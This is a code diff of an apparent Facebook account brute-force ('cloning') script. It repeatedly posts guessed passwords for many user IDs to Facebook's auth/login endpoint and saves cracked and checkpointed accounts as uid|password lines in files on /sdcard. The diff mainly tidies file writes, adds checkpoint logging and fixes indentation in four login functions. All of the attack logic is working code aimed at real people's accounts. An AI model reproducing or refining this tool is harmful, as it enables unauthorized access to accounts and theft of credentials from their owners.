@@ -869,21 +869,25 @@ def login1(uid):
 
             if "session_key" in rp:
                 print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
-                open("/sdcard/BRUTE_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                with open("/sdcard/BRUTE_CLONING-OK.txt", "a") as okfile:
+                    okfile.write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
 
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
-                with open("/sdcard/BRUTE_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\r\r\r\r\033[1;97m[\033[1;91mCHECKPOINT\033[1;97m] \033[1;91m{uid} \033[1;97m=\033[1;91m{pw}\033[1;97m')
+                with open("/sdcard/BRUTE_CLONING-CP.txt", "a") as cpfile:
+                    cpfile.write(uid + "|" + pw + "\n")
                 cps.append(uid)
                 break
+
             else:
                 continue
-        loop += 1
-    except Exception:
-        time.sleep(random.uniform(5, 10))
 
+            loop += 1
+
+        except Exception:
+            time.sleep(random.uniform(5, 10))
 def login2(uid):
     global oks,loop,cps
     Session=requests.session()
@@ -941,19 +945,26 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
             if "session_key" in rp:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
-                os.system('espeak -a 300 " Cracked Ok id,"')
-                with open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
+                with open("/sdcard/OLD_CLONING-OK.txt", "a") as okfile:
+                    okfile.write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
+
             elif "www.facebook.com" in rp['error']['message']:
+                print(f'\r\r\r\r\r\033[1;97m[\033[1;91mCHECKPOINT\033[1;97m] \033[1;91m{uid} \033[1;97m=\033[1;91m{pw}\033[1;97m')
+                with open("/sdcard/OLD_CLONING-CP.txt", "a") as cpfile:
+                    cpfile.write(uid + "|" + pw + "\n")
                 cps.append(uid)
                 break
+
             else:
                 continue
-        loop += 1
-    except Exception:
-        time.sleep(random.uniform(5, 10))
+
+            loop += 1
+
+        except Exception:
+            time.sleep(random.uniform(5, 10))
 def login3(uid):
     global oks, loop, cps
     Session = requests.session()
@@ -1011,19 +1022,26 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
             if "session_key" in rp:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
-                os.system('espeak -a 300 " Cracked Ok id,"')
-                with open("/sdcard/MIX_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
+                with open("/sdcard/MIX_CLONING-OK.txt", "a") as okfile:
+                    okfile.write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
+
             elif "www.facebook.com" in rp['error']['message']:
+                print(f'\r\r\r\r\r\033[1;97m[\033[1;91mCHECKPOINT\033[1;97m] \033[1;91m{uid} \033[1;97m=\033[1;91m{pw}\033[1;97m')
+                with open("/sdcard/MIX_CLONING-CP.txt", "a") as cpfile:
+                    cpfile.write(uid + "|" + pw + "\n")
                 cps.append(uid)
                 break
+
             else:
                 continue
-        loop += 1
-    except Exception:
-        time.sleep(random.uniform(5, 10))
+
+            loop += 1
+
+        except Exception:
+            time.sleep(random.uniform(5, 10))
 
 def login4(uid):
     global oks, loop, cps
@@ -1082,19 +1100,26 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
             if "session_key" in rp:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
-                os.system('espeak -a 300 " Cracked Ok id,"')
-                with open("/sdcard/RANDOM_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
+                with open("/sdcard/RANDOM_CLONING-OK.txt", "a") as okfile:
+                    okfile.write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
+
             elif "www.facebook.com" in rp['error']['message']:
+                print(f'\r\r\r\r\r\033[1;97m[\033[1;91mCHECKPOINT\033[1;97m] \033[1;91m{uid} \033[1;97m=\033[1;91m{pw}\033[1;97m')
+                with open("/sdcard/RANDOM_CLONING-CP.txt", "a") as cpfile:
+                    cpfile.write(uid + "|" + pw + "\n")
                 cps.append(uid)
                 break
+
             else:
                 continue
-        loop += 1
-    except Exception:
-        time.sleep(random.uniform(5, 10))
+
+            loop += 1
+
+        except Exception:
+            time.sleep(random.uniform(5, 10))
 if __name__ == "__main__":
 	show_loading()
 	main()
